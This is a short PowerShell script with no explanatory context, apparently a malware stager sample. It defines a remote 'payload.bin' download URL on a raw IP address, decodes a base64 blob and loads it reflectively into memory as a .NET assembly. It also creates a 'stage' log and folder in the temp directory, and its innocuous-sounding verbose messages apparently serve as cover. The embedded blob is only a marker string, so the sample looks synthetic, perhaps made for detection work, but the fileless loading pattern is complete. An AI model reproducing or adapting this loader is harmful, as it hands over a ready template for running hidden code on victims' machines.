
$DownloadUrl = 'http://198.51.100.84/payload.bin'
$ErrorActionPreference = "Stop"

$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp0c3diMGg0cHZt')
Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($StageBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Retry budget remaining"
